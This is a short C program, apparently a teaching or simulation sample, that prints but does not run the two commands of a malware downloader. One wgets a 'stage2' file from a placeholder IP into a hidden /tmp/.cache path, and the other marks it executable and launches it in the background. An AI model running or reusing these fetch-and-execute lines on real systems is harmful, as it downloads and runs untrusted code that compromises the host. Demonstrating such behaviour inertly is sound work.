/* Inert. Prints the command a downloader WOULD run, then exits. */
#include <stdio.h>
int main(void) {
 const char *stage = "wget http://198.51.100.23/stage2 -O /tmp/.cache/stage2";
 const char *persist = "chmod +x /tmp/.cache/stage2 && /tmp/.cache/stage2 &";
 printf("SIMULATION ONLY, nothing runs\n");
 printf("would stage: %s\n", stage);
 printf("would persist: %s\n", persist);
 return 0;
}
